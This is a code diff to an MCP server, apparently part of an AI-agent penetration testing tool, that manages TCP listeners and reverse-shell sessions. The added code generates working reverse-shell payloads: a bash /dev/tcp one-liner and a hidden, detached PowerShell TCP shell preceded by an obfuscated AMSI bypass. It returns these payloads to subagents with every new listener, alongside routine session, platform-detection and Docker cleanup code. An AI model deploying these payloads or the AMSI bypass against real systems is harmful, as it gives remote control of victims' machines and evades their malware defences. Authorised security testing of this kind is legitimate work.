@@ -34,6 +34,7 @@ import signal
 import socket
 import struct
 import subprocess
+import sys
 import termios
 import threading
 import time
@@ -43,6 +44,8 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 from mcp.server.fastmcp import FastMCP
+from starlette.requests import Request
+from starlette.responses import JSONResponse
 
 # Resolve engagement directory relative to the project root, not the server's
 # own directory.  uv run --directory changes cwd to tools/shell-server/, so
@@ -59,6 +62,110 @@ PROBE_COMMAND = "echo __SHELL_PROBE__"
 PROBE_MARKER = "__SHELL_PROBE__"
 MARKER_START = "__CMD_START_7f3a__"
 MARKER_END = "__CMD_END_7f3a__"
+
+# --- Callback IP resolution ---
+
+
+def _resolve_callback_ip() -> str:
+    """Resolve the attackbox callback IP for reverse shell payloads.
+
+    Priority: engagement config callback_ip > callback_interface > tun0 > wg0 > first non-lo.
+    """
+    # Check engagement config (simple key: value parsing — no yaml dependency)
+    config_path = _PROJECT_ROOT / "engagement" / "config.yaml"
+    if config_path.exists():
+        try:
+            text = config_path.read_text()
+            for line in text.splitlines():
+                line = line.strip()
+                if line.startswith("#") or ":" not in line:
+                    continue
+                key, _, val = line.partition(":")
+                val = val.strip().strip("'\"")
+                if key.strip() == "callback_ip" and val:
+                    return val
+                if key.strip() == "callback_interface" and val:
+                    ip = _ip_from_interface(val)
+                    if ip:
+                        return ip
+        except Exception:
+            pass
+
+    # Auto-detect: tun0, wg0, then first non-loopback
+    for iface in ("tun0", "wg0"):
+        ip = _ip_from_interface(iface)
+        if ip:
+            return ip
+
+    # Fallback: first non-loopback IPv4
+    try:
+        result = subprocess.run(
+            ["ip", "-4", "-o", "addr", "show", "scope", "global"],
+            capture_output=True,
+            text=True,
+            timeout=3,
+        )
+        for line in result.stdout.splitlines():
+            parts = line.split()
+            for i, p in enumerate(parts):
+                if p == "inet" and i + 1 < len(parts):
+                    return parts[i + 1].split("/")[0]
+    except Exception:
+        pass
+
+    return "CALLBACK_IP"
+
+
+def _ip_from_interface(iface: str) -> str | None:
+    """Get IPv4 address from a network interface name."""
+    try:
+        result = subprocess.run(
+            ["ip", "-4", "-o", "addr", "show", "dev", iface],
+            capture_output=True,
+            text=True,
+            timeout=3,
+        )
+        for line in result.stdout.splitlines():
+            parts = line.split()
+            for i, p in enumerate(parts):
+                if p == "inet" and i + 1 < len(parts):
+                    return parts[i + 1].split("/")[0]
+    except Exception:
+        pass
+    return None
+
+
+def _linux_payload(ip: str, port: int) -> str:
+    """One-liner bash reverse shell for Linux targets."""
+    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+
+
+def _windows_payload(ip: str, port: int) -> str:
+    """Detached PowerShell reverse shell with AMSI bypass for Windows targets.
+
+    AMSI bypass patches amsiInitFailed via split strings + [char] casts.
+    Start-Process detaches from parent so shell survives xp_cmdshell/cmd /c exit.
+    """
+    amsi = (
+        "$a=[Ref].Assembly.GetType("
+        "'System.Management.Automation.'+[char]65+'msi'+[char]85+'tils');"
+        "$b=$a.GetField('a'+'msiI'+'nitF'+'ailed','NonPublic,Static');"
+        "$b.SetValue($null,$true)"
+    )
+    ps_shell = (
+        f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
+        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
+        "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
+        "{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
+        "$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
+    )
+    combined = f"{amsi};{ps_shell}"
+    detached = (
+        f"Start-Process -WindowStyle Hidden powershell -ArgumentList '-c {combined}'"
+    )
+    return f'powershell -c "{detached}"'
+
 
 # Privileged Docker mode
 SHELL_DOCKER_IMAGE = os.environ.get("SHELL_DOCKER_IMAGE", "red-run-shell:latest")
@@ -122,6 +229,44 @@ def _check_docker_shell() -> str | None:
     return None
 
 
+def _find_orphan_containers() -> list[str]:
+    """Find running red-run-* Docker containers not tracked by this process."""
+    try:
+        result = subprocess.run(
+            ["docker", "ps", "--filter", "name=red-run-", "--format", "{{.Names}}"],
+            capture_output=True,
+            text=True,
+            timeout=10,
+        )
+        if result.returncode != 0:
+            return []
+        return [
+            name.strip() for name in result.stdout.strip().split("\n") if name.strip()
+        ]
+    except Exception:
+        return []
+
+
+def _kill_orphan_containers() -> list[str]:
+    """Kill orphaned red-run-* containers from previous MCP sessions.
+
+    Returns list of container names that were killed.
+    """
+    orphans = _find_orphan_containers()
+    killed = []
+    for name in orphans:
+        try:
+            subprocess.run(
+                ["docker", "kill", name],
+                capture_output=True,
+                timeout=10,
+            )
+            killed.append(name)
+        except Exception:
+            pass
+    return killed
+
+
 @dataclass
 class Listener:
     listener_id: str
@@ -152,6 +297,7 @@ class Session:
     container_name: str | None = None  # Docker container name (privileged only)
     pty: bool = False
     prompt_pattern: str = ""
+    platform: str = ""  # "windows" | "linux" | "" (auto-detected or caller-set)
     status: str = "connected"  # "connected" | "stabilized" | "closed"
     connected_at: datetime = field(
         default_factory=lambda: datetime.now(tz=timezone.utc)
@@ -215,11 +361,23 @@ class Session:
 
 
 def _detect_prompt(session: Session) -> str:
-    """Probe the shell to detect its prompt pattern."""
+    """Probe the shell to detect its prompt pattern.
+
+    Also auto-detects platform (windows/linux) from the probe output
+    and sets session.platform if not already set.
+    """
     session.drain(timeout=1.0)
     session.send(f"{PROBE_COMMAND}\n")
     time.sleep(1.0)
     output = session.recv(timeout=3.0)
+
+    # Auto-detect platform from probe output if not already set
+    if not session.platform:
+        out_lower = output.lower()
+        if any(sig in out_lower for sig in ["c:\\", "ps ", "windows", ">echo "]):
+            session.platform = "windows"
+        elif any(sig in out_lower for sig in ["$", "/home/", "/root/", "/bin/"]):
+            session.platform = "linux"
 
     # Look for the line after the probe marker — that's the prompt
     lines = output.split("\n")
@@ -244,8 +402,22 @@ def create_server() -> FastMCP:
     docker_err = _check_docker_shell()
     _docker_shell_available = docker_err is None
 
+    # Kill orphaned containers from previous MCP sessions (crashed, restarted,
+    # etc.) — these hold ports and are invisible to list_sessions().
+    if _docker_shell_available:
+        killed = _kill_orphan_containers()
+        if killed:
+            print(
+                f"[shell-server] Killed {len(killed)} orphaned container(s): "
+                f"{', '.join(killed)}",
+                file=sys.stderr,
+            )
+
+    sse_port = int(os.environ.get("SHELL_SSE_PORT", "8022"))
     mcp = FastMCP(
         "red-run-shell-server",
+        host="127.0.0.1",
+        port=sse_port,
         instructions=(
             "Manages TCP listeners, reverse shell sessions, and local "
             "interactive processes for red-run subagents. Use start_listener "
@@ -260,10 +432,21 @@ def create_server() -> FastMCP:
     sessions: dict[str, Session] = {}
 
     def _cleanup() -> None:
-        """Close all sockets and processes on exit."""
+        """Close all sockets, processes, and Docker containers on exit."""
         for session in sessions.values():
             try:
                 if session.session_type == "local" and session.process:
+                    # Kill Docker container first — SIGTERM to docker CLI
+                    # doesn't reliably propagate to the container process
+                    if session.container_name:
+                        try:
+                            subprocess.run(
+                                ["docker", "kill", session.container_name],
+                                capture_output=True,
+                                timeout=5,
+                            )
+                        except Exception:
+                            pass
                     try:
                         os.killpg(os.getpgid(session.process.pid), signal.SIGTERM)
                         session.process.wait(timeout=5)
@@ -412,11 +595,15 @@ def create_server() -> FastMCP:
         listeners[listener_id] = listener
         listener.thread.start()
 
+        # Resolve callback IP and generate payloads
+        callback_ip = _resolve_callback_ip()
+
         return json.dumps(
             {
                 "listener_id": listener_id,
                 "status": "listening",
                 "address": f"{host}:{port}",
+                "callback_ip": callback_ip,
                 "timeout": timeout,
                 "label": listener.label,
                 "message": (
@@ -424,6 +611,10 @@ def create_server() -> FastMCP:
                     f"this port, then call list_sessions() to check for connections. "
                     f"Listener will timeout after {timeout}s if no connection arrives."
                 ),
+                "payloads": {
+                    "linux": _linux_payload(callback_ip, port),
+                    "windows": _windows_payload(callback_ip, port),
+                },
             },
             indent=2,
         )
@@ -434,6 +625,7 @@ def create_server() -> FastMCP:
         label: str = "",
         timeout: int = 30,
         privileged: bool = False,
+        startup_delay: int = 2,
     ) -> str:
         """Spawn a local interactive process in a PTY.
 
@@ -450,6 +642,9 @@ def create_server() -> FastMCP:
             timeout: Seconds to wait for the process to start and produce
                      initial output (default 30).
             privileged: Run inside the red-run-shell Docker container.
+            startup_delay: Seconds to wait before probing for a prompt
+                     (default 2). Increase for slow-connecting tools like
+                     evil-winrm (30) or psexec.py over high-latency links.
                        The container includes a full pentest toolkit:
                        evil-winrm, impacket (psexec/wmiexec/smbexec/
                        smbclient/mssqlclient), chisel, ligolo-ng, socat,
@@ -508,8 +703,8 @@ def create_server() -> FastMCP:
         except Exception as e:
             return f"ERROR: Failed to start process — {e}"
 
-        # Wait for initial output
-        time.sleep(2.0)
+        # Wait for the process to start (and optionally connect to remote)
+        time.sleep(startup_delay)
 
         # Check if process exited immediately
         if proc.poll() is not None:
@@ -634,7 +829,9 @@ def create_server() -> FastMCP:
                 output = _read_until_prompt(session, timeout, expect)
             else:
                 # Raw shell — use markers to delimit output
-                wrapped = f"echo {MARKER_START}; {command}; echo {MARKER_END}\n"
+                # Windows cmd.exe uses & as separator; Unix uses ;
+                sep = "&" if session.platform == "windows" else ";"
+                wrapped = f"echo {MARKER_START}{sep} {command}{sep} echo {MARKER_END}\n"
                 session.send(wrapped)
                 output = _read_until_marker(session, timeout, expect)
 
@@ -679,26 +876,41 @@ def create_server() -> FastMCP:
             if data:
                 chunks.append(data)
                 combined = "".join(chunks)
-                if MARKER_END in combined:
+                # Check for end marker at a line boundary (not inside echoed cmd)
+                if f"\n{MARKER_END}" in combined or combined.startswith(MARKER_END):
                     break
                 if expect_re and expect_re.search(combined):
                     break
-            elif chunks and MARKER_START in "".join(chunks):
+            elif chunks and f"\n{MARKER_START}" in "".join(chunks):
                 # We have the start marker but no more data — give it a moment
                 time.sleep(0.2)
 
         combined = "".join(chunks)
 
-        # Extract content between markers
-        start_idx = combined.find(MARKER_START)
-        end_idx = combined.find(MARKER_END)
+        # Extract content between markers.  Match markers at line boundaries
+        # to avoid false matches inside echoed commands (Windows cmd.exe echoes
+        # the full "echo MARKER& command& echo MARKER" line before executing).
+        start_idx = -1
+        end_idx = -1
+        for m in re.finditer(re.escape(MARKER_START), combined):
+            pos = m.start()
+            # Valid if at position 0 or preceded by a newline
+            if pos == 0 or combined[pos - 1] == "\n":
+                start_idx = pos
+                break
+        if start_idx != -1:
+            # Search for end marker only after start marker
+            search_from = start_idx + len(MARKER_START)
+            for m in re.finditer(re.escape(MARKER_END), combined[search_from:]):
+                pos = m.start() + search_from
+                if combined[pos - 1] == "\n":
+                    end_idx = pos
+                    break
 
         if start_idx != -1 and end_idx != -1:
-            # Get content between markers, skip the marker line itself
             content = combined[start_idx + len(MARKER_START) : end_idx]
             return content.strip()
         elif start_idx != -1:
-            # Got start marker but not end — return what we have
             content = combined[start_idx + len(MARKER_START) :]
             return content.strip() + "\n[timeout — output may be incomplete]"
         else:
@@ -755,6 +967,20 @@ def create_server() -> FastMCP:
             return f"ERROR: Session '{session_id}' is closed."
         if session.pty:
             return f"Session '{session_id}' already has a PTY."
+        if session.platform == "windows":
+            return json.dumps(
+                {
+                    "status": "skipped",
+                    "session_id": session_id,
+                    "platform": "windows",
+                    "message": (
+                        "PTY stabilization is not applicable to Windows shells. "
+                        "The session is usable via send_command() with Windows-"
+                        "compatible command separators (auto-detected)."
+                    ),
+                },
+                indent=2,
+            )
 
         methods_to_try: list[tuple[str, str]] = []
         if method == "auto":
@@ -858,6 +1084,7 @@ def create_server() -> FastMCP:
                 }
             )
 
+        tracked_containers: set[str] = set()
         for sid, session in sessions.items():
             if session.session_type == "local":
                 addr = f"local (PID {session.remote_addr[1]})"
@@ -870,19 +1097,37 @@ def create_server() -> FastMCP:
                 "label": session.label,
                 "status": session.status,
                 "pty": session.pty,
+                "platform": session.platform or "unknown",
                 "connected_at": session.connected_at.isoformat(),
                 "transcript_lines": len(session.transcript),
             }
             if session.session_type == "local":
                 entry["command"] = session.command
                 entry["privileged"] = session.privileged
+                if session.container_name:
+                    entry["container_name"] = session.container_name
+                    tracked_containers.add(session.container_name)
             else:
                 entry["port"] = session.port
             if session.live_log:
                 entry["live_log"] = str(session.live_log)
             result["sessions"].append(entry)
 
+        # Detect orphaned Docker containers not tracked by this MCP instance
+        if _docker_shell_available:
+            running = _find_orphan_containers()
+            orphans = [c for c in running if c not in tracked_containers]
+            if orphans:
+                result["orphan_containers"] = orphans
+                result["orphan_warning"] = (
+                    f"{len(orphans)} red-run container(s) running outside this "
+                    f"session — likely from a previous MCP instance. These may "
+                    f"be holding ports. Kill with: docker kill <name>"
+                )
+
         if not result["listeners"] and not result["sessions"]:
+            if result.get("orphan_containers"):
+                return json.dumps(result, indent=2)
             return "No listeners or sessions. Use start_listener() to begin."
 
         return json.dumps(result, indent=2)
@@ -1006,12 +1251,68 @@ def create_server() -> FastMCP:
                 prefix = ">>>" if direction == "send" else "<<<"
                 f.write(f"[{ts}] {prefix}\n{data}\n\n")
 
+    # --- HTTP endpoints for run.sh session management ---
+
+    @mcp.custom_route("/status", methods=["GET"])
+    async def status(request: Request) -> JSONResponse:
+        """Session summary for run.sh startup check."""
+        sess_list = []
+        for sid, s in sessions.items():
+            if s.status == "closed":
+                continue
+            if s.session_type == "local":
+                addr = f"local (PID {s.remote_addr[1]})"
+            else:
+                addr = f"{s.remote_addr[0]}:{s.remote_addr[1]}"
+            sess_list.append(
+                {
+                    "id": sid,
+                    "label": s.label,
+                    "addr": addr,
+                    "platform": s.platform or "unknown",
+                    "connected_at": s.connected_at.isoformat(),
+                }
+            )
+        return JSONResponse({"sessions": sess_list, "count": len(sess_list)})
+
+    @mcp.custom_route("/clear", methods=["POST"])
+    async def clear(request: Request) -> JSONResponse:
+        """Close all sessions and listeners."""
+        closed = []
+        for sid, s in list(sessions.items()):
+            if s.status != "closed":
+                closed.append(sid)
+                s.status = "closed"
+                try:
+                    if s.session_type == "local":
+                        if s.container_name:
+                            subprocess.run(
+                                ["docker", "kill", s.container_name],
+                                capture_output=True,
+                                timeout=5,
+                            )
+                        if s.process:
+                            os.killpg(os.getpgid(s.process.pid), signal.SIGTERM)
+                    elif s.conn:
+                        s.conn.close()
+                except Exception:
+                    pass
+        for lid, listener in list(listeners.items()):
+            try:
+                listener.status = "closed"
+                listener.sock.close()
+            except Exception:
+                pass
+        sessions.clear()
+        listeners.clear()
+        return JSONResponse({"cleared": len(closed), "session_ids": closed})
+
     return mcp
 
 
 def main() -> None:
     server = create_server()
-    server.run()
+    server.run(transport="sse")
 
 
 if __name__ == "__main__":
